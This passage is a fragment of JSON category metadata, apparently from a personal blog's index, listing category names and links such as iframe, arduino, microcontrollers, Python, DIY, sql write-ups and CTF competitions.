","link":"/categories/%E5%9C%A8%E7%BA%BF%E5%B0%8F%E5%B7%A5%E5%85%B7/%E9%9F%B3%E4%B9%90/"},{"name":"iframe","slug":"iframe","link":"/categories/iframe/"},{"name":"笔记","slug":"iframe/笔记","link":"/categories/iframe/%E7%AC%94%E8%AE%B0/"},{"name":"单片机","slug":"单片机","link":"/categories/%E5%8D%95%E7%89%87%E6%9C%BA/"},{"name":"笔记","slug":"单片机/笔记","link":"/categories/%E5%8D%95%E7%89%87%E6%9C%BA/%E7%AC%94%E8%AE%B0/"},{"name":"arduino","slug":"单片机/arduino","link":"/categories/%E5%8D%95%E7%89%87%E6%9C%BA/arduino/"},{"name":"Hgame","slug":"Hgame","link":"/categories/Hgame/"},{"name":"arduino","slug":"arduino","link":"/categories/arduino/"},{"name":"单片机","slug":"arduino/单片机","link":"/categories/arduino/%E5%8D%95%E7%89%87%E6%9C%BA/"},{"name":"Python","slug":"Python","link":"/categories/Python/"},{"name":"软件","slug":"Python/软件","link":"/categories/Python/%E8%BD%AF%E4%BB%B6/"},{"name":"WP","slug":"WP","link":"/categories/WP/"},{"name":"wp","slug":"wp","link":"/categories/wp/"},{"name":"sql","slug":"wp/sql","link":"/categories/wp/sql/"},{"name":"DIY","slug":"DIY","link":"/categories/DIY/"},{"name":"CTF","slug":"CTF","link":"/categories/CTF/"},{"name":"比赛","slug":"CTF/比赛","link":"/categories/CTF/%E6%AF%94%E8%B5%9B/"}]}